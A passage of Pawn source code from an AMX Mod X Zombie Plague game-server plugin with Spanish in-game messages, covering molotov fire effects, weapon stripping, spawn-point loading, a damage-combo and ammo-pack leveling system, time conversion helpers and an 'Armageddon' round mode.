	replace_all( msg, 190, "!team" , "^3" )
	replace_all( msg, 190, "!g" , "^4" ) 
	
	if( id ) users[0] = id; else get_players( users , count , "ch" )
	{
		for( new i = 0; i < count; i++ )
		{
			if( g_isconnected[users[i]] )
			{
				message_begin( MSG_ONE, g_msgSayText, _, users[i] )
				write_byte( users[i] )
				write_string( msg )
				message_end( )
			}
		}
	}
}

// Strip Weapons (grenades)
stock ham_strip_weapons( Index, Arma[] )
{
    if( !equal( Arma, "weapon_", 7 ) ) 
		return 0;

    static wId; wId = get_weaponid( Arma )
    if( !wId ) return 0;

    static wEnt
    while( ( wEnt = engfunc( EngFunc_FindEntityByString, wEnt, "classname", Arma ) ) && entity_get_edict( wEnt, EV_ENT_owner ) != Index ) { }
	
    if( !wEnt ) return 0;

    if( g_currentweapon[Index] == wId ) 
		ExecuteHamB( Ham_Weapon_RetireWeapon, wEnt )

    if( !ExecuteHamB( Ham_RemovePlayerItem, Index, wEnt ) ) 
		return 0
		
    ExecuteHamB(Ham_Item_Kill, wEnt)

    set_pev( Index, pev_weapons, pev( Index, pev_weapons ) & ~( 1 << wId ) )

    return 1;
}

#if defined MOLOTOV_ON
stock random_fire(Origin[3], ent) 
{
	new range = floatround(MOLOTOV_RADIUS);
	new iOrigin[3];

	for (new i = 1; i <= 5; i++) 
	{
		g_g = 1;

		iOrigin[0] = Origin[0] + random_num(-range, range);
		iOrigin[1] = Origin[1] + random_num(-range, range);
		iOrigin[2] = Origin[2];
		iOrigin[2] = ground_z(iOrigin, ent);

		while (get_distance(iOrigin, Origin) > range) 
		{
			g_g++;
			
			iOrigin[0] = Origin[0] + random_num(-range, range);
			iOrigin[1] = Origin[1] + random_num(-range, range);
			iOrigin[2] = Origin[2];

			if (g_g >= 7.0) iOrigin[2] = ground_z(iOrigin, ent, 1);
			else iOrigin[2] = ground_z(iOrigin, ent);
		}

		new rand = random_num(5, 15);

		message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
		write_byte(TE_SPRITE);
		write_coord(iOrigin[0]);
		write_coord(iOrigin[1]);
		write_coord(iOrigin[2] + rand * 5);
		write_short(g_flameSpr);
		write_byte(rand);
		write_byte(100);
		message_end();

		if (!(i % 4)) // Smoke every 4th flame
		{	
			message_begin(MSG_BROADCAST, SVC_TEMPENTITY);
			write_byte(TE_SMOKE);
			write_coord(iOrigin[0]);
			write_coord(iOrigin[1]);
			write_coord(iOrigin[2] + 120);
			write_short(g_smokeSpr);
			write_byte(random_num(10, 30));
			write_byte(random_num(10, 20));
			message_end();
		}
	}
}

stock f_radius_damage(attacker, Float:origin[3], Float:damage, Float:range, dmgtype, calc = 1)
{
	new Float:pOrigin[3], Float:dist, Float:tmpdmg;
	new i;

	while (i++ < g_maxplayers) 
	{
		if (!g_isalive[i] || !g_zombie[i] || g_nodamage[i]) continue;

		pev(i, pev_origin, pOrigin);
		dist = get_distance_f(origin, pOrigin);

		if (dist > range) continue;

		if (calc) tmpdmg = damage - (damage / range) * dist;
		else tmpdmg = damage;

		if (get_user_health(i) < tmpdmg) kill(attacker, i);
		else fm_fakedamage(i, "molotov", tmpdmg, dmgtype);
	}

	/*while ((i = engfunc(EngFunc_FindEntityInSphere, i, origin, range))) // warning 211: possibly unintended assignment
	{	
		if (g_isalive[i] && pev(i, pev_takedamage) && g_zombie[i] && !g_nodamage[i]) 
		{
			if (calc) 
			{
				pev(i, pev_origin, pOrigin);
				tmpdmg = damage - (damage / range) * get_distance_f(origin, pOrigin);
			} else tmpdmg = damage;
			
			fm_fakedamage(i, "molotov", tmpdmg, dmgtype);
		}
	}*/
}

stock ground_z(iOrigin[3], ent, skip = 0, iRecursion = 0) 
{
	iOrigin[2] += random_num(5, 80);

	if (!is_valid_ent(ent))	// Fix for: Run time error 10: native error (native "set_pev")
		return iOrigin[2];
	
	new Float:fOrigin[3];

	IVecFVec(iOrigin, fOrigin);

	set_pev(ent, pev_origin, fOrigin);

	engfunc(EngFunc_DropToFloor, ent);

	if (!skip && !engfunc(EngFunc_EntIsOnFloor, ent)) 
		if (iRecursion >= 7.0) skip = 1;

	pev(ent, pev_origin, fOrigin);

	return floatround(fOrigin[2]);
}

stock kill(k, v) 
{
	user_silentkill(v);

	new kteam = get_user_team(k);
	new vteam = get_user_team(v);

	new kfrags = get_user_frags(k) + 1;
	new kdeaths = get_user_deaths(k);
	
	if (kteam == vteam)
		kfrags = get_user_frags(k) - 2;

	new vfrags = get_user_frags(v);
	new vdeaths = get_user_deaths(v);

	message_begin(MSG_BROADCAST, g_msgScoreInfo);
	write_byte(k);
	write_short(kfrags);
	write_short(kdeaths);
	write_short(0);
	write_short(kteam);
	message_end();

	message_begin(MSG_BROADCAST, g_msgScoreInfo);
	write_byte(v);
	write_short(vfrags + 1);
	write_short(vdeaths);
	write_short(0);
	write_short(vteam);
	message_end();

	message_begin(MSG_BROADCAST, g_msgDeathMsg, {0,0,0}, 0);
	write_byte(k);
	write_byte(v);
	write_byte(0);
	write_string("molotov");
	message_end();

	gKills[k]++;
	gKillsRec[v]++;
}
#endif

// Collect random spawn points
stock load_spawns()
{
	// Check for CSDM spawns of the current map
	new cfgdir[32], mapname[32], filepath[100], linedata[64]
	get_configsdir(cfgdir, charsmax(cfgdir))
	get_mapname(mapname, charsmax(mapname))
	formatex(filepath, charsmax(filepath), "%s/csdm/%s.spawns.cfg", cfgdir, mapname)
	
	// Load CSDM spawns if present
	if (file_exists(filepath))
	{
		new csdmdata[10][6], file = fopen(filepath,"rt")
		
		while (file && !feof(file))
		{
			fgets(file, linedata, charsmax(linedata))
			
			// invalid spawn
			if(!linedata[0] || str_count(linedata,' ') < 2) continue;
			
			// get spawn point data
			parse(linedata,csdmdata[0],5,csdmdata[1],5,csdmdata[2],5,csdmdata[3],5,csdmdata[4],5,csdmdata[5],5,csdmdata[6],5,csdmdata[7],5,csdmdata[8],5,csdmdata[9],5)
			
			// origin
			g_spawns[g_spawnCount][0] = floatstr(csdmdata[0])
			g_spawns[g_spawnCount][1] = floatstr(csdmdata[1])
			g_spawns[g_spawnCount][2] = floatstr(csdmdata[2])
			
			// increase spawn count
			g_spawnCount++
			if (g_spawnCount >= sizeof g_spawns) break;
		}
		if (file) fclose(file)
	}
	else
	{
		// Collect regular spawns
		collect_spawns_ent("info_player_start")
		collect_spawns_ent("info_player_deathmatch")
	}
	
	// Collect regular spawns for non-random spawning unstuck
	collect_spawns_ent2("info_player_start")
	collect_spawns_ent2("info_player_deathmatch")
}

// Collect spawn points from entity origins
stock collect_spawns_ent(const classname[])
{
	new ent = -1
	while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", classname)) != 0)
	{
		// get origin
		new Float:originF[3]
		pev(ent, pev_origin, originF)
		g_spawns[g_spawnCount][0] = originF[0]
		g_spawns[g_spawnCount][1] = originF[1]
		g_spawns[g_spawnCount][2] = originF[2]
		
		// increase spawn count
		g_spawnCount++
		if (g_spawnCount >= sizeof g_spawns) break;
	}
}

// Collect spawn points from entity origins
stock collect_spawns_ent2(const classname[])
{
	new ent = -1
	while ((ent = engfunc(EngFunc_FindEntityByString, ent, "classname", classname)) != 0)
	{
		// get origin
		new Float:originF[3]
		pev(ent, pev_origin, originF)
		g_spawns2[g_spawnCount2][0] = originF[0]
		g_spawns2[g_spawnCount2][1] = originF[1]
		g_spawns2[g_spawnCount2][2] = originF[2]
		
		// increase spawn count
		g_spawnCount2++
		if (g_spawnCount2 >= sizeof g_spawns2) break;
	}
}

// Drop primary/secondary weapons
stock drop_weapons(id, dropwhat)
{
	// Get user weapons
	static weapons[32], num, i, weaponid
	num = 0 // reset passed weapons count (bugfix)
	get_user_weapons(id, weapons, num)
	
	// Loop through them and drop primaries or secondaries
	for (i = 0; i < num; i++)
	{
		// Prevent re-indexing the array
		weaponid = weapons[i]
		
		if ((dropwhat == 1 && ((1<<weaponid) & PRIMARY_WEAPONS_BIT_SUM)) || (dropwhat == 2 && ((1<<weaponid) & SECONDARY_WEAPONS_BIT_SUM)))
		{
			// Get weapon entity
			static wname[32], weapon_ent
			get_weaponname(weaponid, wname, charsmax(wname))
			weapon_ent = fm_find_ent_by_owner(-1, wname, id)
			
			// Hack: store weapon bpammo on PEV_ADDITIONAL_AMMO
			set_pev(weapon_ent, PEV_ADDITIONAL_AMMO, cs_get_user_bpammo(id, weaponid))
			
			// Player drops the weapon and looses his bpammo
			engclient_cmd(id, "drop", wname)
			cs_set_user_bpammo(id, weaponid, 0)
		}
	}
}

// Stock by (probably) Twilight Suzuka -counts number of chars in a string
stock str_count(const str[], searchchar)
{
	new count, i, len = strlen(str)
	
	for (i = 0; i <= len; i++)
	{
		if(str[i] == searchchar)
			count++
	}
	
	return count;
}

// Checks if a space is vacant (credits to VEN)
stock is_hull_vacant(Float:origin[3], hull)
{
	engfunc(EngFunc_TraceHull, origin, origin, 0, hull, 0, 0)
	
	if (!get_tr2(0, TR_StartSolid) && !get_tr2(0, TR_AllSolid) && get_tr2(0, TR_InOpen))
		return true;
	
	return false;
}

// Check if a player is stuck (credits to VEN)
stock is_player_stuck(id, is_zombie)
{
	/*static Float:originF[3]
	pev(id, pev_origin, originF)
	
	engfunc(EngFunc_TraceHull, originF, originF, 0, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN, id, 0)
	
	if(is_zombie)
	{
		if(get_tr2(0, TR_StartSolid) || get_tr2(0, TR_AllSolid) || !get_tr2(0, TR_InOpen))
			return true;
	}
	else
	{
		if((get_tr2(0, TR_StartSolid) > g_maxplayers) || (get_tr2(0, TR_AllSolid) > g_maxplayers))
			return true;
	}
	
	return false;*/
	
	new Float:origin[3];
	pev( id, pev_origin, origin );

	if(is_zombie)
	{
		engfunc(EngFunc_TraceHull, origin, origin, 0, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN, id, 0)
		
		if(get_tr2(0, TR_StartSolid) || get_tr2(0, TR_AllSolid) || !get_tr2(0, TR_InOpen))
			return true;
	}
	else
	{
		engfunc( EngFunc_TraceHull, origin, origin, IGNORE_MONSTERS, pev( id, pev_flags ) & FL_DUCKING ? HULL_HEAD : HULL_HUMAN, id, 0 );
		return get_tr2( 0, TR_StartSolid );
	}
	
	return false;
}

// Simplified get_weaponid (CS only)
stock cs_weapon_name_to_id(const weapon[])
{
	static i
	for (i = 0; i < sizeof WEAPONENTNAMES; i++)
	{
		if (equal(weapon, WEAPONENTNAMES[i]))
			return i;
	}
	
	return 0;
}

// Get User Current Weapon Entity
stock fm_cs_get_current_weapon_ent(id)
{
	// Prevent server crash if entity's private data not initalized
	if(pev_valid(id) != 2)
		return -1;
	
	return get_pdata_cbase(id, OFFSET_ACTIVE_ITEM, OFFSET_LINUX);
}

// Get Weapon Entity's Owner
stock fm_cs_get_weapon_ent_owner(ent)
{
	// Prevent server crash if entity's private data not initalized
	if(pev_valid(ent) != 2)
		return -1;
	
	return get_pdata_cbase(ent, OFFSET_WEAPONOWNER, OFFSET_LINUX_WEAPONS);
}

// Get User Team
stock fm_cs_get_user_team(id)
{
	// Prevent server crash if entity's private data not initalized
	if(pev_valid(id) != 2)
		return FM_CS_TEAM_UNASSIGNED;
	
	return get_pdata_int(id, OFFSET_CSTEAMS, OFFSET_LINUX);
}

// Set a Player's Team
stock fm_cs_set_user_team(id, team)
{
	// Prevent server crash if entity's private data not initalized
	if(pev_valid(id) != 2)
		return;
	
	set_pdata_int(id, OFFSET_CSTEAMS, team, OFFSET_LINUX)
	//cs_set_team_id(id, team)
}

// Set User Flashlight Batteries
stock fm_cs_set_user_batteries(id, value)
{
	// Prevent server crash if entity's private data not initalized
	if(pev_valid(id) != 2)
		return;
	
	set_pdata_int(id, OFFSET_FLASHLIGHT_BATTERY, value, OFFSET_LINUX)
}

// Update Player's Team on all clients (adding needed delays)
stock fm_user_team_update(id)
{
	static Float:current_time
	current_time = get_gametime()
	
	if (current_time - g_teams_targettime >= 0.1)
	{
		set_task(0.1, "fm_cs_set_user_team_msg", id+TASK_TEAM)
		g_teams_targettime = current_time + 0.1
	}
	else
	{
		set_task((g_teams_targettime + 0.1) - current_time, "fm_cs_set_user_team_msg", id+TASK_TEAM)
		g_teams_targettime = g_teams_targettime + 0.1
	}
}

// Send User Team Message
public fm_cs_set_user_team_msg(taskid)
{
	// Note to self: this next message can now be received by other plugins
	
	// Set the switching team flag
	g_switchingteam = true
	
	// Tell everyone my new team
	emessage_begin(MSG_BROADCAST, g_msgTeamInfo)
	ewrite_byte(ID_TEAM) // player
	ewrite_string(CS_TEAM_NAMES[fm_cs_get_user_team(ID_TEAM)]) // team
	emessage_end()
	
	// Done switching team
	g_switchingteam = false
}

public fm_cs_set_user_model(taskid) set_user_info(ID_MODEL, "model", g_playermodel[ID_MODEL]) // Set User Model
stock fm_cs_get_user_model(player, model[], len) get_user_info(player, "model", model, len) // Get User Model -model passed byref-

// Update Player's Model on all clients (adding needed delays)
public fm_user_model_update(taskid)
{
	static Float:current_time
	current_time = get_gametime()
	
	if (current_time - g_models_targettime >= (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 1.0 : 0.01))
	{
		fm_cs_set_user_model(taskid)
		g_models_targettime = current_time
	}
	else
	{
		set_task((g_models_targettime + (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 1.0 : 0.01)) - current_time, "fm_cs_set_user_model", taskid)
		g_models_targettime = g_models_targettime + (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 1.0 : 0.01)
	}
}

a_lot_of_blood(id) // ROFL, thanks to jtp10181 for his AMX Ultimate Gore plugin.
{
	// Get user origin
	static iOrigin[3]
	get_user_origin(id, iOrigin)
	
	// Blood spray
	message_begin(MSG_PVS, SVC_TEMPENTITY, iOrigin)
	write_byte(TE_BLOODSTREAM)
	write_coord(iOrigin[0])
	write_coord(iOrigin[1])
	write_coord(iOrigin[2]+10)
	write_coord(random_num(-360, 360)) // x
	write_coord(random_num(-360, 360)) // y
	write_coord(-10) // z
	write_byte(70) // color
	write_byte(random_num(50, 100)) // speed
	message_end()
	
	// Write Small splash decal
	for (new j = 0; j < 4; j++) 
	{
		message_begin(MSG_PVS, SVC_TEMPENTITY, iOrigin)
		write_byte(TE_WORLDDECAL)
		write_coord(iOrigin[0]+random_num(-100, 100))
		write_coord(iOrigin[1]+random_num(-100, 100))
		write_coord(iOrigin[2]-36)
		write_byte(random_num(190, 197)) // index
		message_end()
	}
}

public ShowCurrentCombo( Index, Damage )
{
	static RGB[3];
	static szDamage[15]; AddDot(Damage, szDamage, 14)
	static szDamageTotal[15]; AddDot(gDamageCombo[Index], szDamageTotal, 14)
	switch( gComboMultiplier[Index] )
	{
		case 0: RGB = { 255, 255, 255 }
		case 1: RGB = { 0, 255, 0 }
		case 2: RGB = { 0, 0, 255 }
		case 3: RGB = { 255, 255, 0 }
		case 4: RGB = { 255, 0, 255 }
		case 5: RGB = { 255, 0, 0 }
	}
	
	set_hudmessage( RGB[0], RGB[1], RGB[2], -1.0, 0.57, 0, 1.0, 8.0, 0.01, 0.01 )
	ShowSyncHudMsg( Index, g_MsgSync3, "%s^nDaño: %s | Daño total: %s", gInfoCombo[Index], szDamage, szDamageTotal )
}
public InformacionCombo( taskid ) gInfoCombo[ID_INFOCOMBO][0] = '^0'
public FinishCombo( taskid )
{
	static iWin, Index;
	Index = ID_FINISHCOMBO
	
	if( gCombo[Index] > gMaxCombo[Index] && !g_survivor[Index] && !gWesker[Index] && !gJason[Index] )
	{
		gMaxCombo[Index] = gCombo[Index]
		if( gMaxCombo[Index] > gMaxComboGLOBAL )
		{
			gMaxComboGLOBAL = gMaxCombo[Index]
			static szMaxComboGLOBAL[15]; AddDot(gMaxComboGLOBAL, szMaxComboGLOBAL, 14)
			CC(0, "!g[ZP]!y Felicitaciones. !g%s!y ahora tiene el !gcombo más grande (%s)!y", g_playername[Index], szMaxComboGLOBAL)
			
			copy(COMBO_SQL_szName, charsmax(COMBO_SQL_szName), g_playername[Index])
		}
	}
	
	iWin = ( gCombo[Index] * ( (gComboMultiplier[Index]+1) + gTH_Mult[Index][0] ) )
	UpdateAps(Index, iWin, 0, 1)
	
	if( iWin > 0 )
	{
		static RGB[3];
		static szWinAps[15]; AddDot(iWin, szWinAps, 14)
		static szDamageTotal[15]; AddDot(gDamageCombo[Index], szDamageTotal, 14)
		switch( gComboMultiplier[Index] )
		{
			case 0: RGB = { 255, 255, 255 }
			case 1: 
			{
				RGB = { 000, 255, 000 }
				if( g_isalive[Index] ) emit_sound(Index, CHAN_BODY, "zombie_plague/tcs_combo2.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
				else client_cmd(Index, "spk ^"zombie_plague/tcs_combo2.wav^"")
			}
			case 2: 
			{
				RGB = { 000, 000, 255 }
				if( g_isalive[Index] ) emit_sound(Index, CHAN_BODY, "zombie_plague/tcs_combo3.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
				else client_cmd(Index, "spk ^"zombie_plague/tcs_combo3.wav^"")
			}
			case 3: 
			{
				RGB = { 255, 255, 000 }
				if( g_isalive[Index] ) emit_sound(Index, CHAN_BODY, "zombie_plague/tcs_combo4.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
				else client_cmd(Index, "spk ^"zombie_plague/tcs_combo4.wav^"")
			}
			case 4: 
			{
				RGB = { 255, 000, 255 }
				if( g_isalive[Index] ) emit_sound(Index, CHAN_BODY, "zombie_plague/tcs_combo5.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
				else client_cmd(Index, "spk ^"zombie_plague/tcs_combo5.wav^"")
			}
			case 5:
			{
				RGB = { 255, 000, 000 }
				if( g_isalive[Index] ) emit_sound(Index, CHAN_BODY, "zombie_plague/tcs_combo6.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
				else client_cmd(Index, "spk ^"zombie_plague/tcs_combo6.wav^"")
				
				if(gCombo[Index] >= 2500)
				{
					fnUpdateLogros(Index, LOGRO_HUMAN, COMBO_2500)
					
					if(gCombo[Index] >= 5000)
					{
						fnUpdateLogros(Index, LOGRO_HUMAN, COMBO_5000)
					
						if(gCombo[Index] >= 10000)
							fnUpdateLogros(Index, LOGRO_HUMAN, COMBO_10000)
					}
				}
			}
		}
	
		set_hudmessage( RGB[0], RGB[1], RGB[2], -1.0, 0.57, 0, 1.0, 8.0, 0.01, 0.01 )
		ShowSyncHudMsg( Index, g_MsgSync3, "Ganaste %s ammopacks.^nDaño total: %s", szWinAps, szDamageTotal )
	}
	
	gCombo[Index] = 0
	gComboMultiplier[Index] = 0
	gDamageCombo[Index] = 0
}

AddDot( Numero, szOutPut[], Longitud )
{
	new szTmp[ 15 ], iOutputPos, iNumPos, iNumLen; iNumLen = num_to_str( Numero, szTmp, 14 )

	while( ( iNumPos < iNumLen ) && ( iOutputPos < Longitud ) ) 
	{
		szOutPut[ iOutputPos++ ] = szTmp[ iNumPos++ ]

		if( ( iNumLen - iNumPos ) && !( ( iNumLen - iNumPos ) % 3 ) )
			szOutPut[ iOutputPos++ ] = '.'
	}

	szOutPut[ iOutputPos ] = EOS

	return iOutputPos;
}

/*public clcmd_papa(Index)
{
	new iAmount = get_pcvar_num(init)
	
	for( new gFors = 0; gFors < get_pcvar_num(init2); gFors++ )
	{
		iAmount += random_num( get_pcvar_num(init3), get_pcvar_num(init4) )
		client_print( 0, print_console, "%d, ", iAmount )
	}
}*/

UpdateAps( id, Amount, edit, conn )
{
	if( conn )
		if( !is_user_connected(id) ) return;
	
	if( Amount > 0 )
	{
		//if( !edit ) Amount *= gTH_Mult[id][0]
		switch(gReset[id])
		{
			case 0:
			{
				if( g_ammopacks[id] == MAX_APS ) return;
				if( ( g_ammopacks[id] + Amount ) > MAX_APS ) g_ammopacks[id] = MAX_APS
				else g_ammopacks[id] += Amount
			}
			case 1:
			{
				if( g_ammopacks[id] == MAX_APS_RESET_1 ) return;
				if( ( g_ammopacks[id] + Amount ) > MAX_APS_RESET_1 ) g_ammopacks[id] = MAX_APS_RESET_1
				else g_ammopacks[id] += Amount
			}
			case 2..3:
			{
				if( g_ammopacks[id] == MAX_APS_RESET_2 ) return;
				if( ( g_ammopacks[id] + Amount ) > MAX_APS_RESET_2 ) g_ammopacks[id] = MAX_APS_RESET_2
				else g_ammopacks[id] += Amount
			}
			case 4..9999:
			{
				if( g_ammopacks[id] == MAX_APS_RESET_4 ) return;
				if( ( g_ammopacks[id] + Amount ) > MAX_APS_RESET_4 ) g_ammopacks[id] = MAX_APS_RESET_4
				else g_ammopacks[id] += Amount
			}
		}
	}
	else g_ammopacks[id] += Amount
	
	new iLvl = 0
	
	switch(gReset[id])
	{
		case 0:
		{
			while( g_ammopacks[id] >= gAMMOPACKS_NEEDED[gLevel[id]] )
			{
				gLevel[id]++
				iLvl++
			}
			
			gAP_Percent[id] = DEF_AP_PERCENT
		}
		case 1:
		{
			while( g_ammopacks[id] >= gAMMOPACKS_NEEDED_RESET(gLevel[id]) )
			{
				gLevel[id]++
				iLvl++
			}
			
			gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET(gLevel[id]-1)) )
		}
		case 2..3:
		{
			while( g_ammopacks[id] >= gAMMOPACKS_NEEDED_RESET_2(gLevel[id]) )
			{
				gLevel[id]++
				iLvl++
			}
			
			gAP_Percent[id] = gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_2(gLevel[id]-1)) )
		}
		case 4..9999:
		{
			while( g_ammopacks[id] >= gAMMOPACKS_NEEDED_RESET_4(gLevel[id]) )
			{
				gLevel[id]++
				iLvl++
			}
			
			gAP_Percent[id] = ( ( float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) ) * 100.0 ) / ( float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id])) - float(gAMMOPACKS_NEEDED_RESET_4(gLevel[id]-1)) )
		}
	}
	
	if( iLvl >= 1 )
	{
		CC( id, "!g[ZP]!y Has subido !g%d nivel%s!y y ahora estás en el !gnivel %d!y", iLvl, iLvl != 1 ? "es" : "", gLevel[id] )
		
		if( !edit ) 
		{
			emit_sound(id, CHAN_BODY, "zombie_plague/tcs_lvlup.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
		}
	
		if( ReqNeedReset_ASD(id) )
			CC( id, "!g[ZP]!y Tienes los suficientes requisitos como para hacer tu !greset %d!", gReset[id]+1 )
	}
}
stock ReqNeedReset_ASD( Index )
{
	switch(gReset[Index])
	{
		case 0: if( gLevel[Index] >= (MAX_LEVEL-1) && g_ammopacks[Index] >= MAX_APS ) return 1;
		case 1: if( gLevel[Index] >= (MAX_LEVEL-1) && g_ammopacks[Index] >= MAX_APS_RESET_1 ) return 1;
		case 2..3: if( gLevel[Index] >= (MAX_LEVEL-1) && g_ammopacks[Index] >= MAX_APS_RESET_2 ) return 1;
		case 4..9999: if( gLevel[Index] >= (MAX_LEVEL-1) && g_ammopacks[Index] >= MAX_APS_RESET_4 ) return 1;
	}
	
	return 0;
}

stock UnixToTime( iTimeStamp , &iYear , &iMonth , &iDay , &iHour , &iMinute , &iSecond )
{
	new iTemp
	
	iYear = 1970
	iMonth = 1
	iDay = 1
	iHour = 0

	while( iTimeStamp > 0 )
	{
		iTemp = IsLeapYear( iYear )

		if( ( iTimeStamp - gYEAR_SECONDS[iTemp] ) >= 0 )
		{
			iTimeStamp -= gYEAR_SECONDS[iTemp]
			iYear++
		}
		else break;
	}

	while( iTimeStamp > 0 )
	{
		iTemp = SecondsInMonth( iYear , iMonth )

		if( ( iTimeStamp - iTemp ) >= 0 ) 
		{
			iTimeStamp -= iTemp
			iMonth++
		}
		else break;
	}

	while( iTimeStamp > 0)
	{
		if( ( iTimeStamp - gDAY_SECONDS ) >= 0 )
		{
			iTimeStamp -= gDAY_SECONDS
			iDay++
		}
		else break;
	}
	
	while( iTimeStamp > 0 )
	{
		if( ( iTimeStamp - gHOUR_SECONDS ) >= 0 )
		{
			iTimeStamp -= gHOUR_SECONDS;
			iHour++;
		}
		else break;
	}
	
	iMinute = ( iTimeStamp / 60 )
	iSecond = ( iTimeStamp % 60 )
}

stock TimeToUnix( const iYear , const iMonth , const iDay , const iHour , const iMinute , const iSecond )
{
	new i, iTimeStamp

	for( i = 1970 ; i < iYear ; i++ )
		iTimeStamp += gYEAR_SECONDS[ IsLeapYear( i ) ]

	for( i = 1 ; i < iMonth ; i++ )
		iTimeStamp += SecondsInMonth( iYear , i )

	iTimeStamp += ( ( iDay - 1 ) * gDAY_SECONDS )
	iTimeStamp += ( iHour * gHOUR_SECONDS )
	iTimeStamp += ( iMinute * gMINUTE_SECONDS )
	iTimeStamp += iSecond

	return iTimeStamp;
}

stock SecondsInMonth( const iYear , const iMonth ) 
	return ( ( IsLeapYear( iYear ) && ( iMonth == 2 ) ) ? ( gMONTH_SECONDS[iMonth - 1] + gDAY_SECONDS ) : gMONTH_SECONDS[iMonth - 1] );

stock IsLeapYear( const iYear ) 
	return ( ( ( iYear % 4 ) == 0 ) && ( ( ( iYear % 100 ) != 0 ) || ( ( iYear % 400 ) == 0 ) ) );
	
public RemoveAllWeaponsEdit(id, ARMA)
{
	for( new weap = 0; weap < 30; weap++ )
	{
		gWeapon[id][(!ARMA) ? ARMA_PRIMARIA : ARMA_SECUNDARIA][weap] = 0
		gWeaponsEdit[id][(!ARMA) ? ARMA_PRIMARIA : ARMA_SECUNDARIA] = 0
	}
}

public StartArmageddon( id )
{	
	new iRand = random_num( 1, 100 );
	
	// Turn every T into a nemesis and CT into a survivor
	for (id = 1; id <= g_maxplayers; id++)
	{
		// Not alive
		if (!g_isalive[id])
			continue;
			
		// Spawn at a random location?
		do_random_spawn(id)
		g_frozen[id] = 0
		
		if( iRand % 2 == 0 )
		{
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_T && !g_nemesis[id])
			{
				zombieme(id, 0, 1, 0, 0, 0)
			}
			else if(fm_cs_get_user_team(id) == FM_CS_TEAM_CT && !g_survivor[id])
			{
				humanme(id, 1, 0, 0, 0, 0, 0)
				
				message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
				write_short(UNIT_SECOND) // duration
				write_short(0) // hold time
				write_short(FFADE_IN) // fade type
				write_byte(g_color_nvg[id][0])
				write_byte(g_color_nvg[id][1])
				write_byte(g_color_nvg[id][2])
				write_byte (0) // alpha
				message_end()
				
				/*message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
				write_short(UNIT_SECOND*4) // duration
				write_short(UNIT_SECOND*4) // hold time
				write_short(FFADE_IN) // fade type
				write_byte(0) // red
				write_byte(0) // green
				write_byte(204) // blue
				write_byte(217) // alpha
				message_end()*/
			}
		}
		else
		{
			if (fm_cs_get_user_team(id) == FM_CS_TEAM_T && !g_survivor[id])
			{
				humanme(id, 1, 0, 0, 0, 0, 0)
				
				message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
				write_short(UNIT_SECOND) // duration
				write_short(0) // hold time
				write_short(FFADE_IN) // fade type
				write_byte(g_color_nvg[id][0])
				write_byte(g_color_nvg[id][1])
				write_byte(g_color_nvg[id][2])
				write_byte (0) // alpha
				message_end()
				
				/*message_begin(MSG_ONE_UNRELIABLE, g_msgScreenFade, _, id)
				write_short(UNIT_SECOND*4) // duration
				write_short(UNIT_SECOND*4) // hold time
				write_short(FFADE_IN) // fade type
				write_byte(0) // red
				write_byte(0) // green
				write_byte(204) // blue
				write_byte(217) // alpha
				message_end()*/
			}
			else if(fm_cs_get_user_team(id) == FM_CS_TEAM_CT && !g_nemesis[id])
			{
				zombieme(id, 0, 1, 0, 0, 0)
			}
		}
	}
	
	// Show Armageddon HUD notice 4
	/*set_hudmessage(random_num( 33, 99 ), random_num( 66, 121 ), random_num( 99, 151 ), HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 4.9, 1.0, 1.0, -1)
	ShowSyncHudMsg(0, g_MsgSync, "¡ MODO ARMAGEDDON !")*/
	
	//ClearSyncHud(id, g_MsgSync)
	
	set_dhudmessage(234, 180, 17, HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 4.9, 1.0, 1.0)
	show_dhudmessage(0, "¡ MODO ARMAGEDDON !")
}

public Notice_1( )
{
	// Show Armageddon HUD notice 1
	set_hudmessage(0, random_num( 188, 222 ), random_num( 188, 222 ), HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 4.9, 1.0, 1.0, -1)
	ShowSyncHudMsg(0, g_MsgSync, "Durante décadas...")
	
	gReduceVel = 30.0
}
public Notice_2( )
{
	// Show Armageddon HUD notice 2
	set_hudmessage(0, random_num( 188, 222 ), random_num( 188, 222 ), HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 4.9, 1.0, 1.0, -1)
	ShowSyncHudMsg(0, g_MsgSync, "se enfrentaron...")
}
public Notice_3( )
{
	// Show Armageddon HUD notice 3
	set_hudmessage(0, random_num( 188, 222 ), random_num( 188, 222 ), HUD_EVENT_X, HUD_EVENT_Y, 1, 0.0, 4.0, 1.0, 1.0, -1)
	ShowSyncHudMsg(0, g_MsgSync, "y hoy llegó el final...")
}
public ReduceSpeed( )
{
	if(gReduceVel >= 200.0)
		return;
	
	gReduceVel += 5.0
		
	set_task(0.01, "ReduceSpeed")
}

public CheckModes( modo, mode_times )
{
	new szDotModes[15];
	new sz_ModeName[32];
	
	AddDot( mode_times, szDotModes, 14 )
	
	switch(modo)
